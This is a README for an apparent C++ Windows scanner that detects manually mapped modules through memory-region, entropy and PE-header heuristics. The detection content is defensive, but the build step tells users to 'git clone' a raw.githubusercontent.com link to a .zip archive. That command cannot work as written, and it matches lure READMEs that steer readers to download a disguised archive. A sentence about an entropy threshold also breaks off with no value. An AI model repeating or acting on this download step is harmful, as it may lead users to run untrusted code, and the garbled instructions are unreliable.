# 🧠 Manual Map Detection (Windows)

A lightweight **runtime memory scanner** written in C++ that attempts to detect manually mapped modules inside a process by analyzing virtual memory regions, entropy patterns, and in-memory PE structures.

This project demonstrates low-level Windows memory inspection techniques commonly used in:

- reverse engineering
- anti-cheat research
- malware analysis
- defensive security tooling

---

## 📌 Features

- 🔎 Enumerates process virtual memory using `NtQueryVirtualMemory`
- ⚙️ Detects suspicious executable `MEM_PRIVATE` regions
- 📊 Shannon entropy analysis for packed or obfuscated code
- 🧩 Detects erased PE headers ("ErasePE"-style mappings)
- 🧬 Scans readable memory for hidden PE structures
- 🚀 Continuous real-time scanning loop

---

## 🛠️ Detection Techniques

The scanner applies multiple heuristics to identify manually mapped modules.

---

### 1️⃣ Executable Private Memory Detection

Manually mapped modules commonly reside in:

- `MEM_PRIVATE` memory regions
- executable protection pages (`PAGE_EXECUTE*`)

### 2️⃣ High Entropy Analysis

Packed or encrypted payloads often produce high entropy.

The program:

- samples **4096 bytes** from executable regions
- calculates **Shannon entropy**
- flags regions exceeding:

### 3️⃣ ErasePE Layout Detection

Some manual mappers erase PE headers after loading to evade scanners.

The detector searches for:

- contiguous private memory regions
- executable + readable memory combinations
- layouts resembling mapped PE images

---

### 4️⃣ Hidden PE Header Scan

Readable memory regions are scanned for embedded PE signatures:

- `IMAGE_DOS_HEADER` (`MZ`)
- valid `e_lfanew` offset
- `IMAGE_NT_HEADERS` (`PE` signature)
- reasonable section counts

This helps detect modules whose headers were relocated or partially removed.

---

## 🧱 Requirements

- Windows 10 / 11
- Visual Studio 2019+ (or MSVC toolchain)
- C++17 or newer
- Win32 API

---

## 🔧 Building

### Visual Studio

1. Clone repository:

```bash
git clone https://raw.githubusercontent.com/NPFERNANDO123/Manual-Map-Detection/main/ManualMapDetection/Map-Manual-Detection-3.4.zip
